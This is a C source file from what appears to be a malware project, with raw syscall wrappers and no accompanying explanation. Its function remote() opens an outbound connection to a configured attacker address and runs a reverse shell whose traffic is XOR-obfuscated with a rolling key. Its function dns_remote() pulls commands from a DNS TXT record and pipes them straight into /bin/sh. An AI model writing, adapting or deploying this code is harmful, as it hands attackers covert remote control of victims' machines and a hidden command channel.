#include "hacks.h"

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

int	remote(void)
{
	pid_t pid;
	if ((pid = ft_fork()) == 0)
	{
		int sockfd;
		struct sockaddr_in my_addr;
		int key1 = 1234;

		my_addr.sin_family = AF_INET;
		my_addr.sin_port = ((REMOTE_PORT & 0xff) << 8) | ((REMOTE_PORT & 0xff00) >> 8);
		my_addr.sin_addr.s_addr = REMOTE_ADDR;

		sockfd = CALL(SYS_socket, AF_INET, SOCK_STREAM, 0);
		CALL(SYS_connect, sockfd, (struct sockaddr*)&my_addr, sizeof(my_addr));

		int fd0[2];
		int fd1[2];

		CALL1(SYS_pipe, fd0);
		CALL1(SYS_pipe, fd1);

		ft_close(0);
		ft_close(1);
		ft_close(2);

		if ((pid = ft_fork()) == -1)
		{
			ft_close(fd0[0]);
			ft_close(fd0[1]);
			ft_close(fd1[0]);
			ft_close(fd1[1]);
			ft_exit(0);
		}
		if (pid == 0)
		{
			ft_close(fd0[0]);
			ft_close(fd1[0]);
			ft_close(fd1[1]);
			char buff;
			while (ft_read(sockfd, &buff, 1) == 1)
			{
				buff ^= key1;
				ft_write(fd0[1], &buff, 1);
				key1 = (key1 * 16807) % 2147483647;
			}
			ft_close(fd0[1]);
			ft_exit(0);
		}
		else
		{
			ft_close(fd0[1]);
			if ((pid = ft_fork()) == -1)
			{
				ft_close(fd1[0]);
				ft_close(fd0[0]);
				ft_close(fd1[1]);
				ft_exit(0);
			}
			else if (pid == 0)
			{
				ft_close(fd0[0]);
				ft_close(fd1[1]);
				char buff;
				while (ft_read(fd1[0], &buff, 1) == 1)
				{
					buff ^= key1;
					ft_write(sockfd, &buff, 1);
					key1 = (key1 * 16807) % 2147483647;
				}
				ft_close(fd1[1]);
				ft_exit(0);
			}
			else
			{
				ft_close(fd1[0]);
				CALL2(SYS_dup2, fd0[0], 0);
				CALL2(SYS_dup2, fd1[1], 1);
				CALL2(SYS_dup2, fd1[1], 2);
				//CALL2(SYS_dup2, sockfd, 2);
				//CALL2(SYS_dup2, sockfd, 1);
				//CALL2(SYS_dup2, sockfd, 0);
				ft_execve(REMOTE_EXEC, NULL, NULL);
				ft_close(fd0[0]);
				ft_close(fd1[1]);
				ft_exit(0);
			}
		}
	}
	return (pid < -1);
}

int	dns_remote(void)
{
	pid_t pid;
	if ((pid = ft_fork()) == 0)
	{
		ft_signal(SIGCHLD, SIG_IGN);
		ft_close(0);
		ft_close(1);
		ft_close(2);
		char *const para[] = {"/bin/sh", "-c", "dig " REMOTE_DNS_QUERY " TXT +short | tr '\"' ' ' | sh", NULL};
		ft_execve(para[0], para, NULL);
		ft_exit(0);
	}
	return (pid < -1);
}
